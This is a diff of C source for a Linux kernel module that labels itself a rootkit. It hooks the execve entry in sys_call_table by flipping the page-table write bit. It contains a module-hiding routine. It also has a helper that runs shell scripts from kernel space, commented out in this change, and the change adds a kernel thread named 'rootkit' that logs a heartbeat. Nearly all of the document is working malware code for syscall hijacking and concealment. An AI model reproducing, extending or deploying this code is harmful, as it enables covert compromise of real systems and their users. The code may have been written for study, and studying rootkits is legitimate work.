@@ -8,7 +8,7 @@
 #include <asm/paravirt.h>    /* write_cr0 */
 #include <asm/pgtable.h>     /* pte_mkwrite */
 
-struct task_struct *my_kthread; 
+struct task_struct *kt; 
 unsigned long *syscall_table;
 pte_t *pte;
 
@@ -27,6 +27,7 @@ void module_hide(void) {
 	THIS_MODULE->notes_attrs = NULL;
 }
 
+/*
 
 static int exec_cmd(char *script){
 	char cmd[] = "/bin/sh";
@@ -41,7 +42,7 @@ static int exec_cmd(char *script){
 	envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
 	envp[2] = NULL;
 
-    /* use UHM_WAIT_PROC to get useful error information */
+        /* use UHM_WAIT_PROC to get useful error information *
 	pr_info("ROOTKIT executing %s\n", argv[1]);
 	if (call_usermodehelper(cmd, argv, envp, UMH_NO_WAIT)) {
 		//pr_info("ROOTKIT call_usermodehelper() failed\n");
@@ -51,28 +52,28 @@ static int exec_cmd(char *script){
 	}
 }
 
+*/
 
-// static int threadfn(void *data){
-// 	do {
-// 		exec_cmd("/tmp/rootkit.sh\0");
-// 		msleep(5000);
-// 	} while(!kthread_should_stop());
 
-// 	pr_info("ROOTKIT kernel thread stopping\n");
-// 	return 0;
-// }
+static int threadfn(void *data){
+	do {
+		pr_info("Kernel thread heartbeat (5s)");
+		msleep(5000);
+	} while(!kthread_should_stop());
+	
+	pr_info("ROOTKIT kernel thread stopping\n");
+	return 0;
+}
 
 static int __init my_init(void)
 {
-	int cpu;
 	unsigned long *execve_addr;
 	unsigned int level;
 
 	syscall_table = NULL;
 	execve_addr = NULL;
-	cpu = 0;
 
-    pr_info("ROOTKIT module loaded at 0x%p\n", my_init);
+	pr_info("ROOTKIT module loaded at 0x%p\n", my_init);
 
 	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
 	pr_info("ROOTKIT syscall_table is at %p\n", syscall_table);
@@ -84,30 +85,22 @@ static int __init my_init(void)
 	pr_info("ROOTKIT execve is at %p\n", execve_addr);
 	
 	if (syscall_table != NULL) {
-		
-        //write_cr0 (read_cr0 () & (~ 0x10000));
-        pte->pte |= _PAGE_RW;
+		pte->pte |= _PAGE_RW;
 
-        real_execve = (void *)syscall_table[__NR_execve];
-        syscall_table[__NR_execve] = &new_execve;
+		real_execve = (void *)syscall_table[__NR_execve];
+		syscall_table[__NR_execve] = &new_execve;
 
-        //write_cr0 (read_cr0 () | 0x10000);
-        pte->pte &= ~_PAGE_RW;
-
+		pte->pte &= ~_PAGE_RW;
 		printk(KERN_EMERG "ROOTKIT sys_call_table hooked\n");
 	} else {
 		printk(KERN_EMERG "ROOTKIT sys_call_table is NULL\n");
 	}
 
 	//module_hide();
-	
-	// for_each_online_cpu(cpu) {
-	// 	// create, bind, wake
-	// 	pr_info("ROOTKIT Starting kernel thread on cpu %d\n", cpu);
-	// 	my_kthread = kthread_create(threadfn, &cpu, "rootkit");
-	// 	kthread_bind(my_kthread, cpu);
-	// 	wake_up_process(my_kthread);	
-	// }
+	 
+	pr_info("ROOTKIT Starting main kernel thread.");
+	kt = kthread_create(threadfn, NULL, "rootkit");
+	wake_up_process(kt);
 	
 	return 0;
 }
@@ -115,16 +108,14 @@ static int __init my_init(void)
 
 static void __exit my_exit(void)
 {
-	kthread_stop(my_kthread);
+	kthread_stop(kt);
 
 	if (syscall_table != NULL) {
 
-        //write_cr0 (read_cr0 () & (~ 0x10000));
         pte->pte |= _PAGE_RW;
 
         syscall_table[__NR_execve] = real_execve;
 
-        //write_cr0 (read_cr0 () | 0x10000);
         pte->pte &= ~_PAGE_RW;
 
 		printk(KERN_EMERG "ROOTKIT sys_call_table unhooked\n");
